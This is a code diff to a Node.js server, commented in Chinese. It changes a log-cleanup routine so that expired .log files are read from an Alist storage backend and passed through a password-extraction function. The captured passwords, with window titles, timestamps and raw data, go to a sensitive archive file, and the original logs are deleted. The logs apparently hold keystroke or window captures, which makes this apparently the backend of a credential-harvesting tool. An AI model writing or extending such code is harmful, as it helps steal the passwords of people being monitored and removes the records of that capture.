@@ -1511,21 +1511,35 @@ function handleWebSocketConnection(ws, req) {
 }
 
 //自动清理过期日志文件 
-
-
-// 扫描过期日志文件（不删除，仅列出）
-async function scanExpiredLogs() {
+async function cleanExpiredLogs() {
     const now = Date.now();
     const retentionMs = CONFIG.logRetentionDays * 24 * 60 * 60 * 1000;
-    const expiredFiles = [];
+    let cleanedCount = 0;
+    let savedPasswordsCount = 0; // 改名为保存的密码条数
 
     try {
-        const allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
+        let allFiles;
+        try {
+            allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
+        } catch (err) {
+            logger.error(`[日志清理] 无法列出文件: ${err.message}`);
+            return;
+        }
+
         const logFiles = allFiles.filter(f => f.filename.endsWith('.log'));
+        if (logFiles.length === 0) {
+            logger.debug('[日志清理] 没有 .log 文件需要检查');
+            return;
+        }
+
+        logger.info(`[日志清理] 开始检查 ${logFiles.length} 个日志文件，保留 ${CONFIG.logRetentionDays} 天`);
 
         for (const file of logFiles) {
             const dateMatch = file.filename.match(/(\d{8})\.log$/);
-            if (!dateMatch) continue;
+            if (!dateMatch) {
+                logger.debug(`[日志清理] 跳过无法识别日期的文件: ${file.filename}`);
+                continue;
+            }
 
             const dateStr = dateMatch[1];
             const year = parseInt(dateStr.substring(0, 4));
@@ -1534,24 +1548,58 @@ async function scanExpiredLogs() {
             const fileDate = new Date(year, month, day);
             const fileAge = now - fileDate.getTime();
 
-            if (fileAge > retentionMs) {
-                expiredFiles.push({
-                    filename: file.filename,
-                    date: dateStr           // 格式 20260428，方便展示
-                });
+            if (fileAge <= retentionMs) continue;
+
+            const filePath = `${CONFIG.alist.basePath}/${file.filename}`;
+            logger.info(`[日志清理] 发现过期文件: ${file.filename} (日期: ${dateStr})`);
+
+            try {
+                // 1. 读取文件内容
+                const content = await alistClient.readFile(filePath);
+
+                // 2. 使用现有的密码提取逻辑，而不是简单过滤
+                const extractedPasswords = extractPasswordsFromLog(content, file.filename);
+
+                // 3. 如果有提取到密码，追加保存到归档文件
+                if (extractedPasswords.length > 0) {
+                    // 生成类似 extracted_passwords.txt 的格式化文本块
+                    let block = `\n--- ${file.filename} (deleted on ${new Date().toISOString()}) ---\n`;
+                    extractedPasswords.forEach((item, index) => {
+                        block += `${index + 1}. 来自: ${item.file}\n`;
+                        block += `窗口: ${item.window || '未知'}\n`;
+                        block += `时间: ${item.timestamp}\n`;
+                        block += `内容: ${item.password}\n`;
+                        block += `原始数据: ${item.rawPassword}\n\n`;
+                    });
+
+                    const dir = path.dirname(CONFIG.sensitiveLogSavePath);
+                    if (!fs.existsSync(dir)) {
+                        fs.mkdirSync(dir, { recursive: true });
+                    }
+                    await fs.promises.appendFile(CONFIG.sensitiveLogSavePath, block, 'utf8');
+                    savedPasswordsCount += extractedPasswords.length;
+                    logger.debug(`[日志清理] 从 ${file.filename} 提取并保存了 ${extractedPasswords.length} 条密码`);
+                }
+
+                // 4. 删除源文件
+                await alistClient.deleteFile(filePath);
+                cleanedCount++;
+                logger.info(`[日志清理] 已删除: ${file.filename}`);
+
+            } catch (err) {
+                logger.error(`[日志清理] 处理 ${file.filename} 时出错: ${err.message}`);
             }
         }
 
-        // 按日期降序排列，最新的在前
-        expiredFiles.sort((a, b) => b.date.localeCompare(a.date));
-        return expiredFiles;
+        logger.info(`[日志清理] 清理完成：删除 ${cleanedCount} 个文件，保存 ${savedPasswordsCount} 条密码`);
     } catch (err) {
-        logger.error(`[扫描过期日志] 失败: ${err.message}`);
-        throw err;
+        logger.error(`[日志清理] 全局异常: ${err.message}`);
     }
 }
 
-//清理选中的日志文件
+
+// server.js -> cleanSelectedLogs 函数
+
 async function cleanSelectedLogs(filenames) {
     const results = [];
     let totalClean = 0, totalSaved = 0;
@@ -1594,6 +1642,44 @@ async function cleanSelectedLogs(filenames) {
 
     logger.info(`[清理选中] 完成：删除 ${totalClean} 个，保存 ${totalSaved} 条密码`);
     return { results, totalClean, totalSaved };
+}
+
+// 扫描过期日志文件（不删除，仅列出）
+async function scanExpiredLogs() {
+    const now = Date.now();
+    const retentionMs = CONFIG.logRetentionDays * 24 * 60 * 60 * 1000;
+    const expiredFiles = [];
+
+    try {
+        const allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
+        const logFiles = allFiles.filter(f => f.filename.endsWith('.log'));
+
+        for (const file of logFiles) {
+            const dateMatch = file.filename.match(/(\d{8})\.log$/);
+            if (!dateMatch) continue;
+
+            const dateStr = dateMatch[1];
+            const year = parseInt(dateStr.substring(0, 4));
+            const month = parseInt(dateStr.substring(4, 6)) - 1;
+            const day = parseInt(dateStr.substring(6, 8));
+            const fileDate = new Date(year, month, day);
+            const fileAge = now - fileDate.getTime();
+
+            if (fileAge > retentionMs) {
+                expiredFiles.push({
+                    filename: file.filename,
+                    date: dateStr           // 格式 20260428，方便展示
+                });
+            }
+        }
+
+        // 按日期降序排列，最新的在前
+        expiredFiles.sort((a, b) => b.date.localeCompare(a.date));
+        return expiredFiles;
+    } catch (err) {
+        logger.error(`[扫描过期日志] 失败: ${err.message}`);
+        throw err;
+    }
 }
 
 // ========== HTTP API 路由 ==========
